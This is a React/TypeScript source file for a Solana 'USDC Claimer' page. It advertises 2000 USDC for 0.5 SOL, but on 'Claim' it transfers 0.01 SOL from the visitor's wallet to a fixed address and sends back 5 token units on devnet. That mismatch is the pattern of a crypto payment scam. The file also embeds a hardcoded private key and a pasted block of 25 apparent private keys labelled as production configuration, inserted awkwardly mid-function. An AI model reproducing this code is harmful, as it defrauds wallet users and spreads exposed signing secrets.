/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "DFVB2XArV9CS2jXzDRzivMSRaWMMt9bUAXMRKEMujgFSw6X4rXTzn2dbruRdnLYeWvqPivooGrU9tDci7KB4wUb"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "54uTzVZznqouVjajvmDiBX2QqsXTLUSwU1Dv38MsmxNjyHdvBXugKF5TVyr5S144ejiG1RvatDfNF4idQ8HF6xcX",
  "key1": "4vfvUc1LGJFcnQusaExDWUEmXuVEVoYbk3QXjJ5gX3LkcehujB9mXMrkoqpPsLU3nkjHbpven99dkdKN9jhQMdeR",
  "key2": "3WQ65GuBZ56i1PHGwPJjL9QX12Xovqz8DoHvkR5EYpBeZRUKKoMFJUW9FQTF6uwgK5tBaJzg3dAdY6cLA6pqyXAj",
  "key3": "5suzxWcHAuYABuZB724zmEndJzDeZ9WGfzzzS13nqjVA6SwHqCVches1HDZ1n9g2vhV47WQd3FfiggUJZmzVUNuc",
  "key4": "3EBNi7qnCNmwvXGMbi6Mn8NUw8i5STmHMem4XH3AHmdzu8utbrDGzooUnhC5ZrTGzoow3YEx2J12mHuY6CJ5bF6s",
  "key5": "5vJ3kR8ocUbLgvCcwFP59E6okCys8fNSfzgWL1SjDWEKUoBrQ7yycmrwHh7CJaKiKHqMyqBe42C6L3fpb9GTyE7v",
  "key6": "4ZvBSLx25xdo87fqYiPkhnr5UWbm3kHfCFcgpT3hyYASxtFn4xWKcwoHNonnkjfvUC5EWDhei1gMGDT6e98xbDjC",
  "key7": "42MApZcBXEKLZUYit4CQWVCc1vSPh8N8s7PW663PQLLZDrYryu1z88t5J3AoqkTH96GKoKGrnp8Tet3ftnGzv6ix",
  "key8": "4hLtH9StZWcVzUM4tvDELeDcnSzMNFfAvrdze3qDZH7LmPBxDmNQJHEAMCPreVCxXtdE62PdnWsZeECrWeLWRzS5",
  "key9": "25iEE9BAfj6949DdrCzdR2Sz1HPzSs81X4cq8WoYEMUfgTQDtrW7bf5mkET6ju2hV2FyQWriEeqU1icBdps3v52t",
  "key10": "4jZxowqs5FiTL4taoDv3QZahFvFCQqRgpKzFjhzPDpyQThTMYSFahx2q98ncXsrLMnn5YtM9p6JmCS9VgEzZZp4p",
  "key11": "4PfbvKPydu6oEz5yEYP83pi24edW6JRiSQ5b8VE8FVPiqCPyCjLDK6o6ZKn1D7p7cfLuME1bKJpYrAxGANuy7MNf",
  "key12": "pS5fHMYMEYr8gygZJc1drZ2kJrhd9ET9Utqh9VPRxUmoQtZfjPTnjTsWV7Dk5ad3wVNYtZyc5TaUWLRVbGZMCPC",
  "key13": "3ALKrKyZ67AmqLuRWec6xhx3dCW61GQLxHYNh3Zt1Cbh5H4r7put9Pk1JRW1xAG2GAzs8tQXNPMqK4vHKdow1k6d",
  "key14": "a4NCqrpdPraBLWj2kUxjmvtpceobHHrdyuYBcUgEwtVPHMVWwME1oSrCAUzLdHDdXARKPvdwbigkdj6866jWZ4W",
  "key15": "3JdnJKhvr7YFRWZkJwLfQSbpNF48zzNuCD2BDkpLhog2S253rgGxCV8Vx8DnLqEnPixGrMJkqygo9oHmUjqpWm3Y",
  "key16": "3GB5p8Wrt6rWnMdKieu2eyXL5SK11irboutMJPKzsfrkSNuQQJPj8Dw8QyFb4XERo9kvhJC5VU5ndbd6e2XqLewU",
  "key17": "3KBv6UMhZ54wG4nWvYUK2k6knjBbWRoDJozkmwoSKTuqexcXM414Ce7KsY4hmvCUMjWzXvAfCvg7ExzWtC1iacWH",
  "key18": "wL54tD3D5DF4rEQLgoqFHzxa8C4TGFJonpXfZr6ViXRPur7p24CXEQo666dF6wxKz64toMzDnysryUgSqw63WaZ",
  "key19": "ctqJncMSNRDskPdfb7vP4Ec8QuqTunZH9yzKxyucYbynhV6kqXvrnVcFfm6VApdFKtoUQ9nDzv3ffVDg4tm2w1S",
  "key20": "hejKqPPJtutFsyLgwQWqy9MxiuT73Hax9gXJbpxVn2EgsHTYjKTVyGdLTpazxA8ifyAgH7pVqE78EA5FbhCem31",
  "key21": "2vdBQGPp45K4HSUNRmFoXDBWr7vYVYTmVajfLGaTb94tLd3F6WuDg8fkXH2m4VZbcD3gUhYKuCvWEik6YaDeiZFu",
  "key22": "5xr9Y4ivaBuX4mKrk9QihhuXBTpLvBvduEwRJzHdyguBRyeoMUEmoEtHqzPrmkgC3eDkFZ9adqpSWK3QoqECjE8p",
  "key23": "5smzz7hF64xUXY6LADFsm9VUX7DGBmeJdUT7y4mgkVxXuN6s7sQ9EDoeo2bveS83b5xg9SsuieZiiyTrVMhVFQD",
  "key24": "56heT1K5U7UKkSdt2DBXoPRhfST8TB2pZAqYErgAN6QhrCdNHUTWDxxD86UPHxvuY1dmTpm7r2DGuQVCeweGpUA9"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
